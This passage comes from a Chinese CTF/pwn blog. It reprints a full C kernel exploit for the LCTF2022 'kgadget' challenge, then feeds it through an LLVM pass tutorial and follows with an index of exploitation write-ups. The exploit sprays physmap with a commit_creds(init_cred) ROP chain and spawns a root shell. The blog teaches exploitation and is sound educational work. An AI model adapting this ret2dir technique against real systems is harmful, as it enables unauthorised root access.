22-7-7.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810C92E0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82A6B700</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81C00FB0</span> + <span class="number">0x1B</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> ret = <span class="number">0xFFFFFFFF810001FC</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> poprsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">long</span> page_size;</span><br><span class="line"><span class="type">size_t</span>* map_spray[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span> guess;</span><br><span class="line"><span class="type">int</span> dev;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">makeROP</span><span class="params">(<span class="type">size_t</span>* space)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); index++)</span><br><span class="line">        space[index] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line">    <span class="keyword">for</span>(; index &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); index++)</span><br><span class="line">        space[index] = ret;</span><br><span class="line">    space[index++] = poprdi_ret;</span><br><span class="line">    space[index++] = init_cred;</span><br><span class="line">    space[index++] = commit_creds;</span><br><span class="line">    space[index++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = <span class="number">0xdeadbeefdeadbeef</span>;</span><br><span class="line">    space[index++] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    space[index++] = user_cs;</span><br><span class="line">    space[index++] = user_rflags;</span><br><span class="line">    space[index++] = user_sp;</span><br><span class="line">    space[index] = user_ss;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spray content below:&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)space, page_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    dev = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev &lt; <span class="number">0</span>)     <span class="comment">// failed to open key device, an unexpected error</span></span><br><span class="line">        error_log(<span class="string">&quot;Cannot open device \&quot;/dev/kgadget\&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);      <span class="comment">// the size of a page, namely 4096 bytes</span></span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Spraying physmap......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    map_spray[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    makeROP(map_spray[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="number">15000</span>; i++)&#123;</span><br><span class="line">        map_spray[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(!map_spray[i])</span><br><span class="line">            error_log(<span class="string">&quot;Mmap Failure!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(map_spray[i], map_spray[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    guess = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line"></span><br><span class="line">    info_log(<span class="string">&quot;Ready to turn to kernel......&quot;</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(<span class="string">&quot;mov r15, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, 0xdeadbeef;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, 0xcafebabe;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, 0x87654321;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9, poprsp_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0x10;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rcx, 0x12345678;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, guess;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, 0x1bf52;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, dev;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用下面的命令可以生成.ll文件准备输入到LLVM中：<code>clang -emit-llvm -S firstLLVMtest.c -o firstLLVMtest.ll</code></p><p>生成的.ll文件的前面一部分内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;firstLLVMtest.c&#x27;</span><br><span class="line">source_filename = &quot;firstLLVMtest.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@commit_creds = dso_local constant i64 -2129882400, align 8</span><br><span class="line">@init_cred = dso_local constant i64 -2103003392, align 8</span><br><span class="line">@swapgs_restore_regs_and_return_to_usermode = dso_local constant i64 -2118119477, align 8</span><br><span class="line">@ret = dso_local constant i64 -2130705924, align 8</span><br><span class="line">@poprdi_ret = dso_local constant i64 -2130131216, align 8</span><br><span class="line">@poprsp_ret = dso_local constant i64 -2129361968, align 8</span><br><span class="line">@add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = dso_local constant i64 -2130233346, align 8</span><br><span class="line">@.str = private unnamed_addr constant [23 x i8] c&quot;Status has been saved.\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [5 x i8] c&quot;%#5x\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [4 x i8] c&quot;   \00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [6 x i8] c&quot;%02x \00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [4 x i8] c&quot;%s\0A\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [34 x i8] c&quot;\1B[31m\1B[1m[x] Fatal Error: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [27 x i8] c&quot;\1B[33m\1B[1m[*] Info: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [30 x i8] c&quot;\1B[32m\1B[1m[+] Success: %s\1B[0m\0A\00&quot;, align 1</span><br><span class="line">@.str.8 = private unnamed_addr constant [24 x i8] c&quot;Ready to get root......\00&quot;, align 1</span><br><span class="line">@.str.9 = private unnamed_addr constant [20 x i8] c&quot;Failed to get root!\00&quot;, align 1</span><br><span class="line">@.str.10 = private unnamed_addr constant [10 x i8] c&quot;Root got!\00&quot;, align 1</span><br><span class="line">@.str.11 = private unnamed_addr constant [8 x i8] c&quot;/bin/sh\00&quot;, align 1</span><br><span class="line">@page_size = common dso_local global i64 0, align 8</span><br><span class="line">@user_cs = common dso_local global i64 0, align 8</span><br><span class="line">@user_rflags = common dso_local global i64 0, align 8</span><br><span class="line">@user_sp = common dso_local global i64 0, align 8</span><br><span class="line">@user_ss = common dso_local global i64 0, align 8</span><br><span class="line">@.str.12 = private unnamed_addr constant [21 x i8] c&quot;Spray content below:\00&quot;, align 1</span><br><span class="line">@.str.13 = private unnamed_addr constant [13 x i8] c&quot;/dev/kgadget\00&quot;, align 1</span><br><span class="line">@dev = common dso_local global i32 0, align 4</span><br><span class="line">@.str.14 = private unnamed_addr constant [35 x i8] c&quot;Cannot open device \22/dev/kgadget\22!\00&quot;, align 1</span><br><span class="line">@.str.15 = private unnamed_addr constant [23 x i8] c&quot;Spraying physmap......\00&quot;, align 1</span><br><span class="line">@map_spray = common dso_local global [16000 x i64*] zeroinitializer, align 16</span><br><span class="line">@.str.16 = private unnamed_addr constant [14 x i8] c&quot;Mmap Failure!\00&quot;, align 1</span><br><span class="line">@guess = common dso_local global i64 0, align 8</span><br><span class="line">@.str.17 = private unnamed_addr constant [30 x i8] c&quot;Ready to turn to kernel......\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save_status() #0 &#123;</span><br><span class="line">  call void asm sideeffect &quot;mov user_cs, cs;mov user_ss, ss;mov user_sp, rsp;pushf;pop user_rflags;&quot;, &quot;~&#123;dirflag&#125;,~&#123;fpsr&#125;,~&#123;flags&#125;&quot;() #6, !srcloc !2</span><br><span class="line">  call void @info_log(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @info_log(i8* %0) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = load i8*, i8** %2, align 8</span><br><span class="line">  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i8* %3)</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码是可读的，用另外一种方式阐述了代码的执行流程。</p><p>然后使用下面的命令生成.so文件，作为LLVM的动态链接库LLVMFirst.so：<br><code>clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared myFirstLLVMpass.cpp -o LLVMFirst.so `llvm-config --ldflags</code></p><p>最后用下面的命令将.ll文件输入到LLVM中，如果想要得到结果可以在后面添加<code>&gt; [文件名]</code>来获取：<br><code>opt -load ./LLVMFirst.so -hello ./firstLLVMtest.ll</code></p><p>其执行结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WARNING: You&#x27;re attempting to print out a bitcode file.</span><br><span class="line">This is inadvisable as it may cause display problems. If</span><br><span class="line">you REALLY want to taste LLVM bitcode first-hand, you</span><br><span class="line">can force output with the `-f&#x27; option.</span><br><span class="line"></span><br><span class="line">Hello: save_status</span><br><span class="line">Hello: info_log</span><br><span class="line">Hello: print_binary</span><br><span class="line">Hello: error_log</span><br><span class="line">Hello: success_log</span><br><span class="line">Hello: getShell</span><br><span class="line">Hello: makeROP</span><br><span class="line">Hello: main</span><br></pre></td></tr></table></figure><p>可以看到输出了很多Hello开头的行，这是因为在上面的C++程序中，我们在匿名命名空间中重载了runOnFunction函数，让LLVM输出Hello之后再输出函数的名字，这样就有了上面的几行。</p><p>在LLVM pass中可以对函数、函数中的循环、函数中的操作指令等一系列对象进行记录、修改等各种操作，具体的操作类参见<a href="https://blog.csdn.net/mamamama811/article/details/110165333?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165736882716782246435214%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165736882716782246435214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110165333-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&utm_term=llvm%20pass&spm=1018.2226.3001.4187">资料</a>。在下一篇文章中笔者会详细分析一道题，过一下LLVM pass类pwn题的流程。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnhome 个人博客快速索引（持续更新）</title>
      <link href="/2023/02/28/pwnhome-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%BF%AB%E9%80%9F%E7%B4%A2%E5%BC%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2023/02/28/pwnhome-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%BF%AB%E9%80%9F%E7%B4%A2%E5%BC%95%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>笔者学习pwn已经有一段时间了，有的时候想回顾一些知识点，翻看以前的文章却发现很难查找。这里编写一个快速索引，帮助自己以及各位读者快速找到自己需要了解的知识点。</p><p>笔者的github仓库内含多个方向的pwn题，在文章中分析过的题目会及时更新到这个仓库中：<a href="https://github.com/Hornos3/pwnfile">pwnfile</a></p><p>更新：由于做的题越来越多，github仓库不堪重负，为精简仓库，现将题目附件另外保存到网盘上，使读者能够选择性下载想要研究的题目而不是非要更新整个仓库。原github仓库只保存解题exp，如有不便敬请谅解。</p><p>链接：<a href="https://pan.baidu.com/s/12_wpe0icND_Z5VXlLloKNg">https://pan.baidu.com/s/12_wpe0icND_Z5VXlLloKNg</a><br>提取码：ipwn</p><h1 id="1-glibc分析系列"><a href="#1-glibc分析系列" class="headerlink" title="1. glibc分析系列"></a>1. glibc分析系列</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/122868272">how2heap深入学习(1)</a>：glibc 2.23版本fastbin_dup、fastbin_dup_consolidate、fastbin_into_stack、house_of_einherjar、house_of_force、house_of_lore，部分_int_free函数检查（2.23版本）<br><a href="https://blog.csdn.net/qq_54218833/article/details/122897689">how2heap深入学习(2)</a>：glibc 2.23版本house_of_mind_fastbin、house_of_orange<br><a href="https://blog.csdn.net/qq_54218833/article/details/123306684">how2heap深入学习(3)</a>：glibc 2.23版本house_of_roman、house_of_spirit、house_of_storm<br><a href="https://blog.csdn.net/qq_54218833/article/details/123395646">how2heap深入学习(4)</a>：glibc 2.23版本large_bin_attack、mmap_overlapping_chunks、overlapping_chunks、overlapping_chunks_2、poison_null_byte<br><a href="https://blog.csdn.net/qq_54218833/article/details/123407435">how2heap深入学习(5)</a>：glibc 2.23版本unsafe_unlink、unsorted_bin_attack、unsorted_bin_into_stack<br><a href="https://blog.csdn.net/qq_54218833/article/details/123444930">how2heap深入学习(6)</a>：glibc 2.27版本fastbin_dup、fastbin_reverse_into_tcache、house_of_botcake、house_of_einherjar、house_of_force、house_of_lore<br><a href="https://blog.csdn.net/qq_54218833/article/details/123588647">how2heap深入学习(7)</a>：glibc 2.27版本house_of_mind_fastbin、house_of_storm，large_bin的链入过程<br><a href="https://blog.csdn.net/qq_54218833/article/details/123630186">how2heap深入学习(8)</a>：glibc 2.27版本large_bin_attack、mmap_overlapping_chunks、overlapping_chunks、poison_null_byte、tcache_house_of_spirit、tcache_poisoning、tcache_stashing_unlink_attack、unsafe_unlink，切割large_bin返回chunk的过程<br><a href="https://blog.csdn.net/qq_54218833/article/details/124239224">how2heap深入学习(9)</a>：glibc 2.31版本_int_malloc、_int_free函数堆块检查<br><a href="https://blog.csdn.net/qq_54218833/article/details/126401517">house of emma演示程序</a>：高版本glibc利用方式house of emma演示过程详细分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/128484409">house of kiwi演示程序</a>：高版本glibc利用方式house of kiwi演示过程详细分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/128575508">house of pig原题分析与演示程序</a>：glibc 2.31版本house of pig演示过程及原题详细分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/128624427">house of apple v1演示程序</a>：glibc 2.35版本house of apple v1演示过程详细分析</p><h1 id="2-Kernel-pwn系列"><a href="#2-Kernel-pwn系列" class="headerlink" title="2. Kernel pwn系列"></a>2. Kernel pwn系列</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/124360103">Kernel pwn 入门 (1)</a>：搭建kernel环境需要注意的问题、强网杯2018-core <strong>ROP</strong>法题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/124411025">Kernel pwn 入门 (2)</a>：CISCN2017-babydriver <strong>ret2usr</strong>法题解分析（低版本内核SMAP&#x2F;SMEP的绕过）<br><a href="https://blog.csdn.net/qq_54218833/article/details/125647404">Kernel pwn 入门 (3)</a>：LCTF2022-kgadget <strong>ret2dir</strong>法题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/124521291">Kernel pwn 入门 (4)</a>：CISCN2017-babydriver另解，伙伴系统简介，InCTF-kqueue <strong>内核堆溢出</strong>法题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/125875027">Kernel pwn 入门 (5)</a>：0CTF2018-baby <strong>条件竞争（double fetch）</strong> 题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/126004590">Kernel pwn 入门 (6)</a>：强网杯2021-notebook <strong>userfaultfd</strong>法题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/126571321">Kernel pwn 入门 (7)</a>：D^3CTF2019-knote <strong>modprobe_path</strong>学习与题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/127218102">Kernel pwn 入门 (8)</a>：Linux内核内存分配机制简述（伙伴系统、slab、slub）</p><h1 id="3-llvm-pass-pwn系列"><a href="#3-llvm-pass-pwn系列" class="headerlink" title="3. llvm pass pwn系列"></a>3. llvm pass pwn系列</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/125685242">LLVM pass pwn 入门 (1)</a>：llvm pass基础知识<br><a href="https://blog.csdn.net/qq_54218833/article/details/125699994">LLVM pass pwn 入门 (2)</a>：CISCN-2021 satool 题解分析，llvm pass类题目调试方法<br><a href="https://blog.csdn.net/qq_54218833/article/details/125853210">LLVM pass pwn 入门 (3)</a>：红帽杯2021-simpleVM 题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/125879635">LLVM pass pwn 入门 (4)</a>：CISCN-2022 satool 题解分析<br><a href="https://blog.csdn.net/qq_54218833/article/details/126081315">LLVM pass pwn 实战</a>：强网杯2022 yakagame 题解分析</p><h1 id="4-buuoj-刷题记录"><a href="#4-buuoj-刷题记录" class="headerlink" title="4. buuoj 刷题记录"></a>4. buuoj 刷题记录</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/124530348">buuctf-pwn write-ups (1)</a>：1<del>16题<br><a href="https://blog.csdn.net/qq_54218833/article/details/124533708">buuctf-pwn write-ups (2)</a>：17</del>26题，其中第26题是堆题<br><a href="https://blog.csdn.net/qq_54218833/article/details/124639635">buuctf-pwn write-ups (3)</a>：27<del>31题<br><a href="https://blog.csdn.net/qq_54218833/article/details/124834530">buuctf-pwn write-ups (4)</a>：32</del>38题，其中第38题沙箱初探<br><a href="https://blog.csdn.net/qq_54218833/article/details/125251517">buuctf-pwn write-ups (5)</a>：39<del>46题<br><a href="https://blog.csdn.net/qq_54218833/article/details/125385767">buuctf-pwn write-ups (6)</a>：47</del>53题，其中第53题是C++ pwn<br><a href="https://blog.csdn.net/qq_54218833/article/details/125458227">buuctf-pwn write-ups (7)</a>：54<del>61题，其中第60题考linux命令<br><a href="https://blog.csdn.net/qq_54218833/article/details/125567534">buuctf-pwn write-ups (8)</a>：62</del>66题<br><a href="https://blog.csdn.net/qq_54218833/article/details/125600497">buuctf-pwn write-ups (9)</a>：67~72题</p><h1 id="5-ARM-pwn-系列"><a href="#5-ARM-pwn-系列" class="headerlink" title="5. ARM pwn 系列"></a>5. ARM pwn 系列</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/127658611">ARM pwn 入门 (1)</a>：ARM基础知识<br><a href="https://blog.csdn.net/qq_54218833/article/details/127658611">ARM pwn 入门 (2)</a>：第一道ARM pwn——buuoj 第139题 jarvisoj_typo<br><a href="https://blog.csdn.net/qq_54218833/article/details/127716198">ARM pwn 入门 (3)</a>：ROP Emporium ARM版本1-2题<br><a href="https://blog.csdn.net/qq_54218833/article/details/127723312">ARM pwn 入门 (4)</a>：ROP Emporium ARM版本3-5题</p><h1 id="6-musl-pwn系列"><a href="#6-musl-pwn系列" class="headerlink" title="6. musl pwn系列"></a>6. musl pwn系列</h1><p><a 